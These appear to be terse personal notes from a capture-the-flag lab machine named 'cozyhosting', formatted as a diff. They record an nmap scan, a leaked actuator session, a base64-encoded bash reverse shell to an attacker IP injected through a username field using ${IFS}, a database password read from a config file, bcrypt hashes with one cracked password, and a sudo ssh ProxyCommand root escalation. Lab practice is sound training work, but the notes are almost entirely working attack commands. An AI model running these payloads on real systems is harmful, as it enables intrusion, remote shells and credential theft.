@@ -1,0 +1,63 @@
+└─$ nmap -A 10.10.11.230 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-27 13:42 CEST
+Warning: 10.10.11.230 giving up on port because retransmission cap hit (2).
+Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 46.30% done; ETC: 13:43 (0:00:31 remaining)
+Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 13:43 (0:00:06 remaining)
+Nmap scan report for 10.10.11.230
+Host is up (0.040s latency).
+Not shown: 65253 closed tcp ports (conn-refused), 280 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
+|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://cozyhosting.htb/actuator/sessions
+kanderson
+
+
+
+echo '/bin/sh -i >& /dev/tcp/$KaliIP/$Port 0>&1' | base64
+username=user;echo${IFS}'Yourencodedpayload'|base64${IFS}-d|bash;
+
+
+user;echo${IFS}'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzU1NTUgMD4mMQo='|base64${IFS}-d|bash;
+
+app@cozyhosting:/tmp/milo/BOOT-INF/classes$ cat application.properties
+cat application.properties
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+
+psql -h 127.0.0.1 -U postgres
+
+
+   name    |                           password                           | role
+  
+-----------+--------------------------------------------------------------+-----
+--
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
+ 
+ $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+
+
+ 
